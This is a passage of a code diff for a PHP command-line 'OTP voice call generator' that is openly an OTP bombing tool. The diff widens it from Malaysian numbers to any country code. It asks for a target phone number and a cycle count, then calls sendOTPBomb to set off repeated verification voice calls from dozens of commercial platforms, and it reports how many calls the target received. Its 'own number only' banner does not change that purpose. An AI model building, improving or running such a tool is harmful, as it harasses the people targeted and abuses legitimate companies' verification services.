+        echo "   Voice OTP arrives within 30-90 seconds\n";
+        echo "   Works with ANY country code\n\n";
         
-        echo "═══════════════════════════════════════════════════════════════\n";
+        echo "═══════════════════════════════════════════════════════════════════\n";
         
         return $successfulCalls;
     }
@@ -524,48 +560,27 @@ class OTPVoiceCaller {
 // =========================================================================
 
 function clearScreen() {
-    if (is_dir('/data/data/com.termux')) {
-        system('clear');
+    if (strtoupper(substr(PHP_OS, 0, 3)) === 'WIN') {
+        system('cls');
     } else {
-        system(PHP_OS_FAMILY == 'Windows' ? 'cls' : 'clear');
+        system('clear');
     }
-}
-
-function checkTermux() {
-    if (is_dir('/data/data/com.termux')) {
-        echo "📦 Checking Termux setup...\n";
-        
-        // Check termux-api
-        exec('pkg list-installed | grep termux-api', $apiCheck, $returnCode);
-        if ($returnCode !== 0) {
-            echo "   Installing Termux:API...\n";
-            exec('pkg install termux-api -y');
-        }
-        
-        // Check termux-sms
-        exec('pkg list-installed | grep termux-sms', $smsCheck, $returnCode);
-        if ($returnCode !== 0) {
-            echo "   Installing Termux:SMS...\n";
-            exec('pkg install termux-sms -y');
-        }
-        
-        echo "   ✓ Termux ready\n\n";
-        return true;
-    }
-    return false;
 }
 
 function printBanner() {
-    echo "\033[1;32m"; // Green
-    echo "╔══════════════════════════════════════════════════════════════╗\n";
-    echo "║           WORKING OTP VOICE CALL GENERATOR v2.0             ║\n";
-    echo "║                 Malaysia - Verified 2024                    ║\n";
-    echo "║                  ACTUAL VOICE CALLS ONLY                    ║\n";
-    echo "╚══════════════════════════════════════════════════════════════╝\n";
-    echo "\033[1;33m";
-    echo "                 ⚠️  TEST ON YOUR OWN NUMBER ONLY ⚠️\n";
-    echo "               Unauthorized use is ILLEGAL in Malaysia\n";
-    echo "     Computer Crimes Act 1997 - Up to RM100,000 fine + jail\n";
+    echo "\033[1;36m"; // Cyan
+    echo "╔═══════════════════════════════════════════════════════════════════╗\n";
+    echo "║         INTERNATIONAL OTP VOICE CALL GENERATOR v3.0              ║\n";
+    echo "║              50+ VERIFIED WORKING PLATFORMS                      ║\n";
+    echo "║                    REAL VOICE CALLS ONLY                         ║\n";
+    echo "║                    NO WHATSAPP - PURE OTP                        ║\n";
+    echo "╚═══════════════════════════════════════════════════════════════════╝\n";
+    echo "\033[1;31m"; // Red
+    echo "                     ⚠️  LEGAL WARNING ⚠️\n";
+    echo "        This tool is for TESTING your OWN numbers ONLY\n";
+    echo "   Unauthorized use is ILLEGAL in most countries and violates\n";
+    echo "        Computer Fraud and Abuse Act (CFAA) and similar\n";
+    echo "              laws worldwide. You have been warned.\n";
     echo "\033[0m\n";
 }
 
@@ -573,73 +588,86 @@ function main() {
     clearScreen();
     printBanner();
     
-    $isTermux = checkTermux();
+    echo "🌍 This tool works with ANY country in the world\n\n";
     
-    if (!$isTermux) {
-        echo "⚠️  Not running in Termux - SMS features disabled\n";
-        echo "   For best results, run in Termux on Android\n\n";
+    // Get country code
+    while (true) {
+        echo "📞 Enter country code (without +):\n";
+        echo "   Malaysia: 60, Singapore: 65, USA: 1, UK: 44, etc: ";
+        $countryCode = trim(fgets(STDIN));
+        
+        if (is_numeric($countryCode) && strlen($countryCode) <= 3) {
+            break;
+        }
+        echo "❌ Invalid country code\n\n";
     }
     
     // Get phone number
     while (true) {
-        echo "📞 Enter Malaysia WhatsApp number:\n";
-        echo "   Example: 0123456789 or 60123456789: ";
+        echo "\n📞 Enter phone number (without country code):\n";
+        echo "   Example: 1234567890: ";
         $number = trim(fgets(STDIN));
         
         $clean = preg_replace('/[^0-9]/', '', $number);
-        if (strlen($clean) >= 9 && strlen($clean) <= 11) {
+        if (strlen($clean) >= 7 && strlen($clean) <= 12) {
             break;
         }
-        echo "❌ Invalid! Must be 9-11 digits\n\n";
+        echo "❌ Invalid number length\n\n";
     }
     
-    $tempCaller = new OTPVoiceCaller($clean);
+    $tempCaller = new InternationalOTPVoiceCaller($clean, $countryCode);
     $totalPlatforms = $tempCaller->getPlatformCount();
     
     // Get number of cycles
     while (true) {
-        echo "\n🔄 How many OTP cycles? (1-10): ";
+        echo "\n🔄 How many OTP cycles? (1-5): ";
         $cycles = trim(fgets(STDIN));
         
-        if (is_numeric($cycles) && $cycles > 0 && $cycles <= 10) {
+        if (is_numeric($cycles) && $cycles > 0 && $cycles <= 5) {
             $cycles = (int)$cycles;
             break;
         }
-        echo "❌ Please enter 1-10 only.\n";
+        echo "❌ Please enter 1-5 only (to avoid abuse)\n";
     }
     
-    echo "\n⚠️  CONFIRMATION:\n";
-    echo "   • Target: +60{$clean}\n";
-    echo "   • Cycles: {$cycles}\n";
+    echo "\n⚠️  FINAL CONFIRMATION:\n";
+    echo "   • Country: +{$countryCode}\n";
+    echo "   • Number : {$clean}\n";
+    echo "   • Full   : +{$countryCode}{$clean}\n";
+    echo "   • Cycles : {$cycles}\n";
     echo "   • Each cycle = ~{$totalPlatforms} VOICE CALLS\n";
     echo "   • Total calls = " . ($totalPlatforms * $cycles) . "\n\n";
-    echo "   These are REAL VOICE CALLS from:\n";
-    echo "   • Grab, Foodpanda, Shopee, Lazada\n";
-    echo "   • Touch n Go, Boost, AirAsia, BigPay\n";
-    echo "   • Setel, Fave, TNG Plus, Mudah.my\n";
-    echo "   • Carousell, MAE, PrestoMall, Speedmart\n\n";
+    echo "   These are REAL INTERNATIONAL VOICE CALLS\n";
+    echo "   Target will receive calls from USA, UK, Asia, etc.\n\n";
     
-    echo "Type 'YES' to confirm: ";
+    echo "Type 'CONFIRM' to start: ";
     $confirm = trim(fgets(STDIN));
     
-    if (strtoupper($confirm) !== 'YES') {
+    if (strtoupper($confirm) !== 'CONFIRM') {
         echo "\n❌ Cancelled.\n";
         exit;
     }
     
-    echo "\n🚀 Starting OTP Voice Call Generator...\n";
-    echo "   Target will receive calls within 1-2 minutes\n\n";
+    echo "\n🚀 Starting International OTP Voice Call Generator...\n";
+    echo "   Target will receive calls within 30-90 seconds\n";
+    echo "   Press Ctrl+C to stop\n\n";
     sleep(3);
     
     try {
-        $caller = new OTPVoiceCaller($clean);
-        $caller->sendOTPBomb($cycles);
+        $caller = new InternationalOTPVoiceCaller($clean, $countryCode);
+        $result = $caller->sendOTPBomb($cycles);
+        
+        if ($result > 0) {
+            echo "\n✅ SUCCESS! Target received {$result} voice calls\n";
+        } else {
+            echo "\n❌ No calls triggered. Check number format.\n";
+        }
+        
     } catch (Exception $e) {
         echo "\n❌ Error: " . $e->getMessage() . "\n";
     }
     
-    echo "\n✅ Completed!\n";
-    echo "Press ENTER to exit...";
+    echo "\nPress ENTER to exit...";
     fgets(STDIN);
 }
 
